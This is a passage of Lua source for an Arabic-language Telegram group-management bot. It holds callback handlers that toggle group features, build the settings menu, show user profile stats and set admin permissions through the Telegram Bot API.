keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Lock:ID:Bot') and Owner(data) then  
if tonumber(Text:match('(.*)/unNeverland:Lock:ID:Bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id..'Neverland:Lock:ID:Bot'..data.chat_id_,true) 
local Textedit = '✦┇تم تعطيل الايدي '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Lock:ID:Bot:Photo') and Owner(data) then  
if tonumber(Text:match('(.*)/unNeverland:Lock:ID:Bot:Photo')) == tonumber(data.sender_user_id_) then
database:set(bot_id..'Neverland:Lock:ID:Bot:Photo'..data.chat_id_,true) 
local Textedit = '✦┇تم تعطيل الايدي بالصوره '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unLock:delmsg') and BasicConstructor(data) then   
if tonumber(Text:match('(.*)/unLock:delmsg')) == tonumber(data.sender_user_id_) then
database:del(bot_id..'Lock:delmsg'..data.chat_id_) 
local Textedit = '✦┇تم تعطيل التنظيف '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Lock:Games') and Owner(data) then  
if tonumber(Text:match('(.*)/unNeverland:Lock:Games')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Games"..data.chat_id_) 
local Textedit = '✦┇تم تعطيل الالعاب '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unCick:all') and Constructor(data) then  
if tonumber(Text:match('(.*)/unCick:all')) == tonumber(data.sender_user_id_) then
database:set(bot_id..'Cick:all'..data.chat_id_,true)  
local Textedit = '✦┇تم تعطيل تاك للكل '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:zhrf_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:zhrf_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:zhrf_Bots"..data.chat_id_,"close")
local Textedit = '✦┇تم تعطيل الزخرفه '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:brj_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:brj_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:brj_Bots"..data.chat_id_,"close")
local Textedit = '✦┇تم تعطيل الابراج '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:age_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:age_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:age_Bots"..data.chat_id_,"close")
local Textedit = '✦┇تم تعطيل حساب العمر '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:movie_bot') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:movie_bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:movie_bot"..data.chat_id_,"close")
local Textedit = '✦┇تم تعطيل الافلام '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Free:Add:Bots') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/unNeverland:Free:Add:Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id..'Neverland:Free:Add:Bots',true) 
local Textedit = '✦┇تم تعطيل البوت الخدمي '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:insta_bot') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:insta_bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:insta_bot"..data.chat_id_,"close")
local Textedit = '✦┇تم تعطيل الانستا '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/homeaddwd')  then
if tonumber(Text:match('(.*)/homeaddwd')) == tonumber(data.sender_user_id_) then
local Textedit = '✦┇اوامر التحكم في التفعيل والتعطيل '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تفعيل الطرد ', callback_data=data.sender_user_id_.."/Ban:Cheking"},{text = 'تعطيل الطرد', callback_data=data.sender_user_id_.."/unBan:Cheking"},
},
{
{text = 'تفعيل الرفع', callback_data=data.sender_user_id_.."/Add:Group:Cheking"},{text = 'تعطيل الرفع', callback_data=data.sender_user_id_.."/unAdd:Group:Cheking"},
},
{
{text = 'تفعيل الرابط', callback_data=data.sender_user_id_.."/Neverland:Link_Group"},{text = 'تعطيل الرابط', callback_data=data.sender_user_id_.."/unNeverland:Link_Group"},
},
{
{text = 'تفعيل الترحيب', callback_data=data.sender_user_id_.."/Neverland:Chek:Welcome"},{text = 'تعطيل الترحيب', callback_data=data.sender_user_id_.."/unNeverland:Chek:Welcome"},
},
{
{text = 'تفعيل ردود المدير', callback_data=data.sender_user_id_.."/Neverland:Reply:Manager"},{text = 'تعطيل ردود المدير', callback_data=data.sender_user_id_.."/unNeverland:Reply:Manager"},
},
{
{text = 'تفعيل ردود المطور', callback_data=data.sender_user_id_.."/Neverland:Reply:Sudo"},{text = 'تعطيل ردود المطور', callback_data=data.sender_user_id_.."/unNeverland:Reply:Sudo"},
},
{
{text = 'تفعيل اطردني', callback_data=data.sender_user_id_.."/Neverland:Kick:Me"},{text = 'تعطيل اطردني', callback_data=data.sender_user_id_.."/unNeverland:Kick:Me"},
},
{
{text = 'تفعيل المغادره', callback_data=data.sender_user_id_.."/Neverland:Left:Bot"},{text = 'تعطيل المغادره', callback_data=data.sender_user_id_.."/unNeverland:Left:Bot"},
},
{
{text = 'تفعيل الاذاعه', callback_data=data.sender_user_id_.."/Neverland:Status:Bc"},{text = 'تعطيل الاذاعه', callback_data=data.sender_user_id_.."/unNeverland:Status:Bc"},
},
{
{text = 'تفعيل اوامر التحشيش', callback_data=data.sender_user_id_.."/Neverland:Fun_Bots"},{text = 'تعطيل اوامر التحشيش', callback_data=data.sender_user_id_.."/unNeverland:Fun_Bots"},
},
{
{text = 'تفعيل الايدي ', callback_data=data.sender_user_id_.."/Neverland:Lock:ID:Bot"},{text = 'تعطيل الايدي', callback_data=data.sender_user_id_.."/unNeverland:Lock:ID:Bot"},
},
{
{text = 'تفعيل الايدي بالصوره', callback_data=data.sender_user_id_.."/Neverland:Lock:ID:Bot:Photo"},{text = 'تعطيل الايدي بالصوره', callback_data=data.sender_user_id_.."/unNeverland:Lock:ID:Bot:Photo"},
},
{
{text = 'تفعيل التنظيف', callback_data=data.sender_user_id_.."/Lock:delmsg"},{text = 'تعطيل التنظيف', callback_data=data.sender_user_id_.."/unLock:delmsg"},
},
{
{text = 'تفعيل الالعاب', callback_data=data.sender_user_id_.."/Neverland:Lock:Games"},{text = 'تعطيل الالعاب', callback_data=data.sender_user_id_.."/unNeverland:Lock:Games"},
},
{
{text = 'تفعيل تاك للكل', callback_data=data.sender_user_id_.."/Cick:all"},{text = 'تعطيل تاك للكل', callback_data=data.sender_user_id_.."/unCick:all"},
},
{
{text = 'تفعيل للزخرفه', callback_data=data.sender_user_id_.."/Neverland:zhrf_Bots"},{text = 'تعطيل الزخرفه', callback_data=data.sender_user_id_.."/unNeverland:zhrf_Bots"},
},
{
{text = 'تفعيل الابراج', callback_data=data.sender_user_id_.."/Neverland:brj_Bots"},{text = 'تعطيل الابراج', callback_data=data.sender_user_id_.."/unNeverland:brj_Bots"},
},
{
{text = 'تفعيل حساب العمر', callback_data=data.sender_user_id_.."/Neverland:age_Bots"},{text = 'تعطيل حساب للعمر', callback_data=data.sender_user_id_.."/unNeverland:age_Bots"},
},
{
{text = 'تفعيل الافلام', callback_data=data.sender_user_id_.."/Neverland:movie_bot"},{text = 'تعطيل الافلام', callback_data=data.sender_user_id_.."/unNeverland:movie_bot"},
},
{
{text = 'تفعيل البوت الخدمي', callback_data=data.sender_user_id_.."/Neverland:Free:Add:Bots"},{text = 'تعطيل البوت الخدمي', callback_data=data.sender_user_id_.."/unNeverland:Free:Add:Bots"},
},
{
{text = 'تفعيل الانستا', callback_data=data.sender_user_id_.."/Neverland:insta_bot"},{text = 'تعطيل الانستا', callback_data=data.sender_user_id_.."/unNeverland:insta_bot"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
end

if Text and Text:match('(.*)/ideengphoto') then
if tonumber(Text:match('(.*)/ideengphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Alsh,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'ادمن' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'لا يوجد ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Neverland:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (Alsh.total_count_ or 0)
local Texting = {
'مو بشر حلغوم🍼🎀. ',
"فديت الصاك محح💞🍇 . ",
"فـدشـي عمـي💞🍇. ",
"دغـيرهـا شبـي هـاذ 💞🍇. ",
"شهل الگيمر 💞🍇. ",
"شهل الصوره تخمبش 💞🍇. ",
"فديت الحلو 💞 🍇. ",
"بـبكن حـلك 💞🍇. ",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n✦┇Id : '..Id..' .\n✦┇UsErNaMe : '..UserName_User..' .\n✦┇StAsT : '..Status_Gps..' .\n✦┇MsGs : '..NumMsg..' .\n✦┇Activity : '..TotalMsg..' .\n✦┇GaMeS : '..Num_Games..' .'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end
if Text and Text:match('(.*)/idearpphoto') then
if tonumber(Text:match('(.*)/idearpphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Alsh,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'ادمن' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'لا يوجد ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'لا يوجد'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Neverland:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (Alsh.total_count_ or 0)
local Texting = {
'مو بشر حلغوم🍼🎀. ',
"فديت الصاك محح💞🍇 . ",
"فـدشـي عمـي💞🍇. ",
"دغـيرهـا شبـي هـاذ 💞🍇. ",
"شهل الگيمر 💞🍇. ",
"شهل الصوره تخمبش 💞🍇. ",
"فديت الحلو 💞 🍇. ",
"بـبكن حـلك 💞🍇. ",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n✦┇ايـــديك : '..Id..' .\n✦┇يــوزرك : '..UserName_User..' .\n✦┇مــوقعــك : '..Status_Gps..' .\n✦┇رســائــلك : '..NumMsg..' .\n✦┇تفــاعــلك : '..TotalMsg..' .\n✦┇الالعـــاب : '..Num_Games..' .'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end

if Text and Text:match('(.*)/ideeng') then
if tonumber(Text:match('(.*)/ideeng')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Alsh,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'ادمن' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'لا يوجد ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'لا يوجد'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Neverland:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (Alsh.total_count_ or 0)
local Texting = {
'مو بشر حلغوم🍼🎀. ',
"فديت الصاك محح💞🍇 . ",
"فـدشـي عمـي💞🍇. ",
"دغـيرهـا شبـي هـاذ 💞🍇. ",
"شهل الگيمر 💞🍇. ",
"شهل الصوره تخمبش 💞🍇. ",
"فديت الحلو 💞 🍇. ",
"بـبكن حـلك 💞🍇. ",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*✦┇Id : '..Id..'\n✦┇UsErNaMe : * ['..UserName_User..']*\n✦┇StAsT : '..Status_Gps..'\n✦┇MsGs : '..NumMsg..' \n✦┇Activity : '..TotalMsg..'\n✦┇GaMeS : '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end
if Text and Text:match('(.*)/idearp') then
if tonumber(Text:match('(.*)/idearp')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Alsh,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'ادمن' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'لا يوجد ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'لا يوجد'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Neverland:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (Alsh.total_count_ or 0)
local Texting = {
'مو بشر حلغوم🍼🎀. ',
"فديت الصاك محح💞🍇 . ",
"فـدشـي عمـي💞🍇. ",
"دغـيرهـا شبـي هـاذ 💞🍇. ",
"شهل الگيمر 💞🍇. ",
"شهل الصوره تخمبش 💞🍇. ",
"فديت الحلو 💞 🍇. ",
"بـبكن حـلك 💞🍇. ",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*✦┇ايديك : '..Id..'\n✦┇يوزرك : * ['..UserName_User..']*\n✦┇موقعك : '..Status_Gps..'\n✦┇رسائلك : '..NumMsg..' \n✦┇تفاعلك : '..TotalMsg..'\n✦┇الالعاب : '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end

if Text and Text:match('amr@(%d+)/user@(%d+)/setiinginfo') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/setiinginfo$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end 
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=True'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=false'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=True'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
